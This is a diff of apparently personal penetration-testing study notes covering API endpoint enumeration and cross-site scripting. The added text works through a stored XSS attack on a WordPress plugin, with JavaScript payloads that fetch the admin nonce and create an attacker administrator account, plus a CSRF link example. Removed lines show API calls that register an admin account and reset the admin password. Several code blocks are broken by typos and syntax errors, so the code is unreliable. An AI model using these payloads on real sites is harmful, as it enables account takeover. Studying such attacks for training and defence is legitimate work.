@@ -105,7 +105,7 @@ Conventional tools like 'gobuster' can be used to identify API endpoints, which 
 # {GOBUSTER}/v1
 # {GOBUSTER}/v2
 
-gobuster dir -u <IP:PORT> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
+gobuster dir -u <IP> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
 
 # this returns results that follow this function
 
@@ -119,54 +119,177 @@ We can inspect the API by using the curl function:
 ~~~ bash
 
 # the '-i' parameter includes the http headers in the response
-curl -i https://<IP:PORT>/users/v1
+curl -i https://<IP>/users/v1
 
 # this can return a list of users which can be brute-forced
 # it returns several usernames including 'admin'
 
 # with this additional username information known, we can try to breute-force the username component of the api
 
-gobuster dir -u https://<IP:PORT>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+gobuster dir -u https://<IP>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
 
 # this returns additional api information, including 'email' and 'password'
 
-curl -i https://<IP:PORT>/users/v1/admin/password
+curl -i https://<IP>/users/v1/admin/password
 
 # this results in a '405 method not allowed'.  This suggests that the endpoint exists.  By default, the curl command uses the 'GET' method (which is not allowed).  
+
 ~~~
 
-We can use a different HTTP method to see if we can authenticate the known 'admin' username.
+## Steps
+Fix this
+1.  Scan the target with gobuster using a api pattern
+2.  Enumerate users by sending commands to the API endpoint - user/v1
+3.  With a known users scan the user endpoint with gobuster - user/v1/admin
+4.  Call the password endpoint
+
+### Cross site scripting
+Data sanitization is a process in which user input is processed to remove all dangerous characters and strings.  This prevents users from injecting and potentially execute malicious code.
+
+Cross-site scripting (XSS) is a vulnerability that exploits a users trust in a website by dynamically injecting content into the page rendered by the users browser.  XSS is considered high risk and prevalent.
+
+There are two main categories of XSS, 'stored' and 'reflected'.  
+#### Stored XSS
+Stored XSS attacks, which are also know as 'persistent XSS' occur when the exploit payload is stored in a database or otherwise cached by the server.  A single stored XSS vulnerability can therefore attack all site users.
+
+Reflected XSS attacks usually include the payload in a crafted request or link.  The web application takes this value and places into the page content.  This XSS variant only attacks the person submitting the request or visiting the link.  Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.
+
+Either of these two vulnerabilities can manifest as client (browser) or server-side;  the can also be DOM based.
+
+DOM-based XSS takes place solely within the DOM.  
+
+The different types of XSS are differentiated by how the payload is delivered and executed.  All XSS vulnerabilities are run under the context of the user visiting the affected page.  This means that the users browser not the web application executes the XSS payload. 
+
+When a browser processes a servers HTTP response containing HTML, the browser creates a DOM tree and renders it.  The DOM is comprised of all forms, inputs, images e.t.c. related to the web page.  
+#### Java-script refresher
+Java-scripts role is to access and modify the DOM, resulting in a more interactive web user experience.  Fro an attackers perspective, this means that if we can inject java-script code into the application, we can access and modify the page's DOM.  With access to the DOM, we can redirect login forms, extract passwords and steal session cookies.
+
+~~~ js
+function multiplyValues(x,y) {
+	return x * y;
+}
+
+let a = multiplyValues(3,5)
+console.log(a)
+
+~~~
+
+#### Identifying XSS vulnerabilities
+We can find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitised input, which is then displayed as output in subsequent pages.
+
+Once we identify an entry point, we can input special characters and observe the output to determine if any special characters return unfiltered.  
 
 ~~~ bash
-# use the HTTP POST method to try to authenticate a known 'admin' unsername and a test 'password' to see what the response is
+# the most common special characters are
 
-curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login
-
-# -d uses the post method to pass the json login data
-# -H HTTP header to specify that 'application/json' is being passed to the api
-# the ip address, port and end point
-
-# the response confirms that the json format, username and api are available and that the password is not correct.  We will now try to create a new users using the same api with a different endpoint (register)
-
-curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' <IP:PORT>/users/v1/register
-
-# this api call responds with an error message indicating that the register process requires an email to be provided
-
-curl -d '{"password":"fake", "email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://<IP:PORT>/users/v1/register
-
-# this call successfully registers an account and instructs the new user to login to receive an 'authentication token'.  We can now try to login with the new credentials
-
-curl -d '{"password":"lab", "username":"offsec}' -H 'Content-Type: application/json' <IP:PORT>/users/v1/login
-
-# an authenticate token is provided.  We can now check that we have administratve access by changing the admin password
-
-curl \ 'http://<IP:PORT>/users/v1/admin/password' \ -H 'Content-Type: application/json' \ -H 'Authorization: OAuth <token>' \ -d '{"password": "pwned"}'
-
-# the authorization token is passed within the 'Authorization' header along with the new password
+< > ' " { } ;
 
 ~~~
 
-This method (curl) is useful for single apis, however, it doesn't scale efficiently.  We can replicate this in 'Burp-Suite'. 
+#### Basic XSS
+In this example we will exploit a known vulnerability in a Wordpress plugin called 'visitors'.  The plugins main feature is to log the websites visitor data, including the IP, source and User-Agent fields.  The source code for the plugin can be downloaded from its website.  If we inspect the database.php file, we verify how the data is stored inside the Wordpress database.
+
+~~~ php
+
+function VST_save_record() {
+	global $wpdb;
+	$table_name = $wpdb->prefix . 'VST_registros';
+
+	VST_create_table_records();
+
+	return $wpdb->insert(
+				$table_name,
+				array(
+					'patch' => $_SERVER["REQUEST_URI"],
+					'datetime' => current_time( 'mysql' ),
+					'useragent' => $_SERVER['HTTP_USER_AGENT'],
+					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
+				)
+			);
+}
+~~~
+
+In this example 'burp-suite proxy' captures HTTP requests.  These WordPress Visitors plugin captures the 'HTTP User-Agent' data and stores it in the WordPress database.  When the admin reloads the Visitors plugin the start.php code block will run.
+
+Using the 'Burp-suite' repeater function, we can modify the data in the 'User-Agent' field with the code that we want to run.  In this case we will inject the following code:
+
+~~~ js
+
+User-Agent:<script>alert(42)</script>
+
+~~~
+
+Rather than recording this data, it runs the arbitrary code and displays the message block on the sites page. 
+
+#### Session cookies
+With XSS we can steal session cookies and session information if the application uses and insecure session management configuration.  If we can steal an authenticated users session cookie we can masquerade as that user within the target web site.  
+Websites use cookies to track state and information about users.  Cookies can be set with several optional flags, including two that are particularly interesting to us as pen tester:  Secure and HTTPOnly.
+
+The secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.  This protects the cookie from being send in clear text and captured over the network.
+
+The HTTPOnly flag instructs the browser to deny JavaScript access to the cookie.  If this flag is not set, we can use an XSS payload to steal the cookie.
+
+#### Privilege Escalation
+By injecting some JavaScript in the 'User-Agent' HTTP header, which is then run when the WordPress Administrator reloads the plugin the JavaScript is executed.  Because this code is executed by an Administrator, we can use this to inject JavaScript code that creates a new user.  Essentially, code is injected into a WordPress database which also stores information of the relevant plugin.  When the administrator reloads the plugin, the injected code executes, by default with administrative privileges. 
+
+This new attack angle which is to fetch the WordPress admin nonce.  The nonce is a server generated token that is included in the HTTP request to add randomness and prevent Cross-Site-Request-Forgery attacks (CSRF).  A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.  
+The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.
+
+~~~ html
+
+<a href="http://fakecryptonbank.com/send_btc?account=ATTACKER&amount=1000000"">Check out these awesome cat memes!</a>
+
+																			  ~~~
+
+In order to use an exploit above, we need to obtain the WordPress nonce.
+
+~~~ js
+
+// using JS to obtain the WordPress nonce.
+
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = /wp-admin/user-new.php;
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajexRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responceText);
+var nonce = nonceMatch[1];
+
+~~~
+
+Now that we have the WP nonce we can craft the main function responsible for creating the new admin users.
+
+~~~ js
+
+// creating the new wordpress admin user
+
+var params = "action=createuser&_wpnonce_create-user="+nonce+"& user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest =  new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type)", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+
+~~~
+
+Finally we need to encode the minified JavaScript code, so any bad characters wont interfere with sending the payload.  We can do this using the following function.
+
+~~~ js
+
+function encode_to_javascript(string){
+	var input = string;
+	var output = '';
+	for(pos = 0, pos < input.length; pos++); {
+		output += input.charCodeAt(pos);
+		if(pos != (input.length -1)) {
+			output += ",";
+		}
+	} 
+	return output:
+	}
+let encode = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+~~~
+
 ## Tags
 #enumeration
 #nmap 
